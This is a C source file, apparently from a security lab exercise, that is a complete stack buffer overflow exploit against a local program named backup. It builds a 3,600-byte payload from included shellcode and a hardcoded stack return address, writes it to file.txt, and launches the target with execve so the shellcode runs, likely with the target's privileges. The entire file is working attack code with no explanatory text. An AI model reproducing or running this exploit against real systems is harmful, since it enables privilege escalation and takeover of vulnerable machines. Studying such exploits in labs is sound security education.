#include <stdio.h>
#include <unistd.h>
#include </share/shellcode.h>

#define TARGET          "/usr/local/bin/backup"
#define BUFFER_SIZE     3601
#define NOP             0x90



int main() {

        char *args[5], *env[1];
        char buffer[BUFFER_SIZE];
        FILE *malCodeOutput;
        long *prog_addr_ptr, *incr_addr_ptr, *buff_addr_ptr;
        int bsize, i, j;

        //pointer for buffer in backup.c program
        prog_addr_ptr = (long*) 0xffbfcf50;

        //pointer holding value 3588
        incr_addr_ptr = (long*) 0x00000e04;

        // reduce bsize by one (buffer[3600 should be \0
        bsize = BUFFER_SIZE-1;

        //fill buffer with program buffer address
        buff_addr_ptr = (long*) buffer;
        for (i = 0; i < bsize; i+=4) {
                if(i == bsize-12) {
                        *(buff_addr_ptr++) = (long) incr_addr_ptr;
                }
                else {
                        *(buff_addr_ptr++) = (long) prog_addr_ptr;
                }
        }

        //fill the front of the buffer with the shellcode
        for(j = 0; j < strlen(shellcode);j++) {
                buffer[j] = shellcode[j];
        }

        buffer[bsize] = '\0';

        //transfer to file
        malCodeOutput = fopen("file.txt", "w+");
        for(i = 0; i < bsize; i++) {
                fprintf(malCodeOutput, "%c", buffer[i]);
        }
        fclose(malCodeOutput);

        args[0] = TARGET;
        args[1] = "backup";
        args[2] = "file.txt";
        args[3] = "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\0";
        args[4] = NULL;

        env[0] = NULL;

        if(execve(TARGET, args, env) < 0) {
                printf("execve failed to execute\n");
        }

}
